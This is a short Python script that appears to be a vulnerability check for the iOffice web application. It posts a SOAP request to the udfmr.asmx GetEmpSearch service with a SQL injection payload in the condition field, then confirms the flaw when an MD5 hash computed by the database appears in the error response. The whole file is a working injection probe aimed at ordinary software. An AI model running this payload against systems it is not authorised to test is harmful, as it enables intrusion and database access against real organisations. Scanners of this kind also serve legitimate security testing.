import requests,re,urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
a=randomInt(1000000000, 9000000000)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"iOffice/prg/set/wss/udfmr.asmx"
	body='''<?xml version="1.0" encoding="utf-8"?>\r
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r
<soap:Body>\r
<GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">\r
<condition>1=substring(sys.fn_sqlvarbasetostr(HashBytes('MD5',\''''+str(a)+'''\')),3,32)</condition>\r
</GetEmpSearch>\r
</soap:Body>\r
</soap:Envelope>\r'''
	headers={'Content-Type': 'text/xml; charset=utf-8'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 500 and md5(str(a).encode()).hexdigest() in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
